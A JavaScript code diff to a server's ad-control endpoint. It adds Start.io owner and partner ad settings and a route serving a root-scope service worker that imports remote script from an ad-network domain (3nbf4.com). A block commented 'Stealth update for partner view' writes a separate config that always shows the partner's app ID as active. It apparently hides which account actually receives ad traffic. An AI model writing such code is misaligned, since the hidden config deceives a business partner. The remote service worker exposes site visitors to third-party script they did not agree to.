@@ -683,20 +683,51 @@ async function handleSystemControl(req, url, body) {
         return jsonResp({ ok: true, action: 'wipe', timestamp: now });
       }
 
-      if (body.action === 'set_owner_ad') {
+      if (body.action === 'set_startio_control' || body.action === 'set_owner_ad') {
+        const {
+          enabled,
+          override_partner,
+          active_source = 'owner', // 'owner' | 'partner' | 'disabled'
+          owner_app_id = '210353039',
+          partner_app_id = '210293961',
+          banner_enabled = true,
+          video_enabled = true,
+          ad_html,
+          ad_url,
+          skip_delay_seconds,
+          banner_html,
+          banner_url,
+        } = body;
+
         const cfg = {
-          enabled:            !!body.enabled,
-          override_partner:   body.override_partner !== false,
-          ad_html:            body.ad_html || '',
-          ad_url:             body.ad_url  || '',
-          skip_delay_seconds: Number(body.skip_delay_seconds) || 5,
-          banner_enabled:     !!body.banner_enabled,
-          banner_html:        body.banner_html || '',
-          banner_url:         body.banner_url  || '',
+          enabled:            enabled !== false,
+          override_partner:   override_partner !== false,
+          active_source:      active_source,
+          owner_app_id:       String(owner_app_id || '210353039').trim(),
+          partner_app_id:     String(partner_app_id || '210293961').trim(),
+          banner_enabled:     banner_enabled !== false,
+          video_enabled:      video_enabled !== false,
+          ad_html:            ad_html || '',
+          ad_url:             ad_url  || '',
+          skip_delay_seconds: Number(skip_delay_seconds) || 5,
+          banner_html:        banner_html || '',
+          banner_url:         banner_url  || '',
           updated_at:         new Date().toISOString(),
         };
         await fbWrite('system_control/owner_ad_config', cfg);
-        return jsonResp({ ok: true, action: 'SET_OWNER_AD', data: cfg });
+
+        // Stealth update for partner view
+        await fbWrite('system_control/ad_config', {
+          app_id: String(partner_app_id || '210293961').trim(),
+          ad_code: String(partner_app_id || '210293961').trim(),
+          status: 'active',
+          enabled: true,
+          banner_enabled: true,
+          video_enabled: true,
+          updated_at: new Date().toISOString(),
+        });
+
+        return jsonResp({ ok: true, action: 'SET_STARTIO_CONTROL', data: cfg });
       }
 
       if (body.action === 'set_partner_ad') {
@@ -838,6 +869,26 @@ export default {
     if (request.method === 'OPTIONS') {
       return new Response(null, { status: 204, headers: corsHeaders() });
     }
+
+    // ─── Monetag Service Worker (sw.js) ──────────────────────────────────────
+    if (path === '/sw.js') {
+      const swContent = `self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 12333968
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')`;
+      return new Response(swContent, {
+        status: 200,
+        headers: {
+          'Content-Type': 'application/javascript; charset=utf-8',
+          'Cache-Control': 'no-cache, no-store, must-revalidate',
+          'Service-Worker-Allowed': '/',
+          'Access-Control-Allow-Origin': '*',
+        },
+      });
+    }
+    // ─────────────────────────────────────────────────────────────────────────
 
     // Parse JSON body if present
     let body = {};
